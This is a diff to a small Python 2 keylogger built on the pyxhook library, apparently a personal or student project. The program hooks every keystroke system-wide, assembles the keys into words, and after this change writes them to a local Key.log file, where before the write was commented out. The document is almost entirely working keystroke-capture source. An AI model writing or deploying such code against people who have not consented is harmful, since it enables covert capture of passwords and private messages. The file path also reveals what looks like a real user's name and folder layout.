@@ -10,29 +10,30 @@ The program terminates when grave key(`) is pressed
 
 grave key is found below Esc key
 """
-
 import pyxhook
 import os
 
 wordList = []
 
 counter = 0
-log_file = '/media/rochana/University/Acadamic/Untitled Folder/Key.log'       #this should be change according to user preference.
-fob=open(log_file,'w')
 
 def printWord():
 	global counter
+
+	log_file = '/media/rochana/University/Acadamic/Untitled Folder/Key.log'       #this should be change according to user preference.
+	fob=open(log_file,'w')
+
 	wordList.pop(counter)
 	counter-=1
 	print "".join([str(x) for x in wordList] )
-	# fob.write("".join([str(x) for x in wordList] ))
+	fob.write("".join([str(x) for x in wordList] ))
 	counter =0
 	del wordList[:]
 
 def OnKeyPress(event):
 	global counter
 	wordList.append(event.Key)
-  	fob=open(log_file,'a')
+  	
   		
   	if event.Ascii == 8 :
   		wordList.pop(counter)
@@ -62,7 +63,7 @@ def OnKeyPress(event):
 		counter += 1
 
 
-new_hook=pyxhook.HookManager()											#instantiate HookManager class
-new_hook.KeyDown=OnKeyPress												#listen to all keystrokes
-new_hook.HookKeyboard()													#hook the keyboard
-new_hook.start()														#start the session
+new_hook=pyxhook.HookManager()							#instantiate HookManager class
+new_hook.KeyDown=OnKeyPress							#listen to all keystrokes
+new_hook.HookKeyboard()								#hook the keyboard
+new_hook.start()								#start the session
